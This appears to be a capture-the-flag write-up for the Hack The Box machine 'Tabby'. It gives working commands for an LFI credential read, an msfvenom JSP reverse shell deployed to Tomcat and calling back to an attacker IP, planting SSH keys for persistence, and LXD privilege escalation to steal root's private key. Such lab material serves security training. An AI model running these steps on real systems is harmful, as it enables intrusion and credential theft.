## Intro

tags: #OSCPpath #linux #WebApp #LFI #known-binary  #easy

-----
# Reconnaissance

```shell
source basher target1 10.129.71.204 [IP]
source basher host1 tabby.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

## Port scan
### Identify open  TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-19 10:50 -0400
Nmap scan report for 10.129.71.204
Host is up (0.19s latency).
Not shown: 56626 closed tcp ports (reset), 8906 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 20.79 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p80,22,8080 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-19 10:54 -0400
Nmap scan report for tabby.htb (10.129.71.204)
Host is up (0.050s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   55.01 ms 10.10.14.1
2   54.76 ms tabby.htb (10.129.71.204)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.29 seconds

```

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```
no ports found

## Webapp

`http://tabby.htb:8080/`
![](MediaFiles/Pasted%20image%2020260919175456.png)
trying to navigate here `http://tabby.htb:8080/host-manager/html` it gives this error
![](MediaFiles/Pasted%20image%2020260919175714.png)
overall its tomcat9

also the port 80 one
![](MediaFiles/Pasted%20image%2020260919181119.png)

### Directories

first lets scan the port 80 service
```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$target1/FUZZ
```

```shell

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.71.204/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

files                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 49ms]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 50ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 47ms]
:: Progress: [29999/29999] :: Job [1/1] :: 724 req/sec :: Duration: [0:00:46] :: Errors: 1 ::

```
nothing useful here, got forbidden

lets now scan the 8080 service
```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$target1:8080/FUZZ
```

```shell

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.71.204:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 49ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 50ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 65ms]
:: Progress: [29999/29999] :: Job [1/1] :: 660 req/sec :: Duration: [0:00:43] :: Errors: 1 ::
```

### Subdomains

```shell
gobuster dns --domain $target1:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
nothing
### Vhosts enumeration

```shell
curl -s http://$target1:8080 | wc -c
1895
```

```shell
gobuster vhost -u http://$target1:8080 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 1895 -t 50
```
nothing here

-----
# Foothold

## LFI

also via further invetigation on the port 80 service, ifound that the news page url is strange:
`http://megahosting.htb/news.php?file=statement` that indicates LFI

but lets see, what is the root directory of tomcat? from the 8080 service, we now that its located in `/usr/share/tomcat9`
```
This is the default Tomcat home page. It can be found on the local filesystem at: /var/lib/tomcat9/webapps/ROOT/index.html

Tomcat veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME in /usr/share/tomcat9 and CATALINA_BASE in /var/lib/tomcat9, following the rules from /usr/share/doc/tomcat9-common/RUNNING.txt.gz.
```
it also tells us
```
NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". Users are defined in /etc/tomcat9/tomcat-users.xml.
```
so lets try
```
../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

```shell
─$ curl http://tabby.htb:80/news.php?file=../../../../usr/share/tomcat9/etc/tomcat9/tomcat-users.xml                                                  
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```
#### creds obtained

```
tomcat
$3cureP4s5w0rd123!
```
then got to host manager `http://tabby.htb:8080/host-manager/html`
![](MediaFiles/Pasted%20image%2020260919182733.png)

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.247 LPORT=4444 -f war > ch3ckm8.war
```
tjhen run
```shell
curl -T "./ch3ckm8.war" "http://tabby.htb:8080/manager/text/deploy?path=/ch3ckm8&update=true" -u tomcat

Enter host password for user 'tomcat': $3cureP4s5w0rd123!
OK - Deployed application at context path [/ch3ckm8]
```
now go to `http://tabby.htb:8080/ch3ckm8/` to get rev shell

## Shell as tomcat
```shell
└─$ nc -lvnp 4444                                                                                                                              
listening on [any] 4444 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.71.204] 44532
python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat@tabby:/var/lib/tomcat9$ 
```
trying to find users, but permission denied
```shell
tomcat@tabby:/home$ ls
ls
ash
tomcat@tabby:/home$ cd ash
cd ash
bash: cd: ash: Permission denied
tomcat@tabby:/home$ 
```
searching for files belonging to this user:
```shell
find ./ -user ash
```

### Filesystem enumeration

found an interesting zip
```shell
./www/html/files
./www/html/files/16162020_backup.zip
```
lets get the file from the target
```shell
tomcat@tabby:/var/www/html/files$ python3 -m http.server 9001
python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
10.10.14.247 - - [19/Sep/2026 15:44:41] "GET /16162020_backup.zip HTTP/1.1" 200 
```
attacker
```shell
─$ curl http://tabby.htb:9001/16162020_backup.zip -o 16162020_backup.zip                                                               
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   8716 100   8716   0      0  53142      0     
```

## Cracking zip file

```shell
fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip -u

PASSWORD FOUND!!!!: pw == admin@it
```
or
```shell
zip2john 16162020_backup.zip
john backup-zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
there's nothing useful on this extracted folder, but the password can be use to login as `ash` via ssh:

## Shell as ash
```shell
tomcat@tabby:/var/lib/tomcat9$ su - ash
su - ash
Password: admin@it

ash@tabby:~$ whoami
whoami
ash
ash@tabby:~$ ls
ls
user.txt
ash@tabby:~$ cat user.txt
cat user.txt
c9f348cf2ce438831e2fc99682cb1e9e
ash@tabby:~$ 
```
### persistence
lets place our pub key on `/home/ash/.ssh/authorized_keys` to connect via ssh for a more stable shell:
```shell
curl -X PUT http://tabby.htb:9002/home/ash/.ssh/authorized_keys --upload-file ./ch3ckm8
```

-------
# Privesc

## sudo -l
sudo-l failed, then tried enumerating groups

## User's Groups enumeration
```shell
ash@tabby:~$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```
The user _ash_ is a member of the **lxd group**, which allows to deploy containers. 

### Member of Lxd group (allows container deployments)
A container can have the file system of the box mounted and thus it will be possible to read all files from the host system.
https://hacktricks.wiki/en/linux-hardening/user-information/interesting-groups-linux-pe/lxd-privilege-escalation.html
method1

```shell
python3 -m http.server 9001
```
transfer towards target
```shell
wget 10.10.14.247:9001/rootfs.squashfs
wget 10.10.14.247:9001/incus.tar.xz
```

```shell
lxc image import incus.tar.xz rootfs.squashfs --alias alpine
```
did not work, then did this
```shell
/snap/bin/lxc image import incus.tar.xz rootfs.squashfs --alias alpine
export PATH=$PATH:/snap/bin
ash@tabby:~$ lxc image list
lxc image list
+--------+--------------+--------+-----------------------------------------+--------------+-----------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-----------------------------------------+--------------+-----------+--------+------------------------------+
| alpine | 87753e4fa512 | no     | Alpinelinux 3.18 x86_64 (20260919_1616) | x86_64       | CONTAINER | 3.09MB | Sep 19, 2026 at 4:19pm (UTC) |
+--------+--------------+--------+-----------------------------------------+--------------+-----------+--------+------------------------------+
ash@tabby:~$ 
```
then run the following commands

### Exploitation

https://gtfobins.org/gtfobins/lxd/ (a)
```shell
lxd init

lxc init alpine privesc -c security.privileged=true

# Lists the created container
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

lxc start privesc
lxc exec privesc /bin/sh
```

## Shell as root

```shell
ash@tabby:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
<st-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc
ash@tabby:~$ lxc start privesc
lxc start privesc
ash@tabby:~$ lxc exec privesc /bin/sh
lxc exec privesc /bin/sh
~ # ^[[40;5Rwhoami
whoami
root
~ # ^[[40;5Rpwd
pwd
/root
~ # ^[[40;5R

```
grab root private key
```shell
~ # ^[[40;5Rcd /mnt/root/root/.ssh
cd /mnt/root/root/.ssh
/mnt/root/root/.ssh # ^[[40;23Rls
ls
authorized_keys  id_rsa           id_rsa.pub
/mnt/root/root/.ssh # ^[[40;23Rcat id_rsa
cat id_rsa
...[snip]...
```
then copy it to attacker, do chmod 600 and connect via ssh
```shell
└─$ ssh -i root_key root@tabby.htb 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 19 Sep 2026 04:23:12 PM UTC

  System load:  0.1               Processes:                341
  Usage of /:   48.3% of 6.82GB   Users logged in:          0
  Memory usage: 42%               IPv4 address for ens160:  10.129.71.204
  Swap usage:   0%                IPv4 address for lxdfan0: 240.71.204.1


283 updates can be installed immediately.
152 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Sep  7 15:48:53 2021
root@tabby:~# id
uid=0(root) gid=0(root) groups=0(root)
root@tabby:~# ls
root.txt  snap
root@tabby:~# cat root.txt 
69326243bed363a388786f9214b1cb0b
root@tabby:~# 
```

ended at 19:30, overall under 2 hours